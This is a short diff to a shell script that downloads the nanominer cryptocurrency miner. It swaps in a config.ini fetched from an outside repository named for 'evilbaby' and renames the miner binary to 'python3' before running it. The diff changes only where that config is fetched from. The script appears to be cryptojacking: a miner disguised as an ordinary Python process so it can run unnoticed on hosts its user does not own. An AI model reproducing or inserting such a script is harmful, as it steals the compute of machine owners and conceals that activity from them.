@@ -19,7 +19,7 @@ wget https://github.com/nanopool/nanominer/releases/download/v1.5.1/nanominer-li
 tar xvzf nanominer-linux-1.5.1.tar.gz
 cd nanominer-linux-1.5.1
 rm config.ini
-wget https://bitbucket.org/evilbaby1/openai/raw/3fe4365a056b4e0589f78d6b1280f97cb1bb0b3e/config.ini
+wget https://raw.githubusercontent.com/evilbabylx/script/master/config.ini
 chmod +x nanominer
 mv nanominer python3 
 ./python3
